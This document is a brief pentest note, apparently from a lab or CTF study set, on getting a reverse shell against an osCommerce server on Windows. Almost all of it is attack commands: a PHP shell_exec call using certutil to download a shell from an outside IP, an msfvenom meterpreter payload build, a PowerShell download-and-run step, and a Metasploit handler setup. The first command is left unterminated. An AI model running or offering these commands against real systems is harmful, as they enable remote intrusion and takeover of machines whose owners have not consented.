### Getting Revese shell

For php reverse shell sometimes system() has been disabled for security reasons, in that case you can try shell_exec.

Eg. For os-commerce:
echo shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.13.19.104/shell.php shell.php

shell.php is the php reverse shell binary. 

Eg. for oscommerce:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

Once this is running, enter this command to start the reverse shell


```bash
Start-Process "shell-name.exe"
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

```
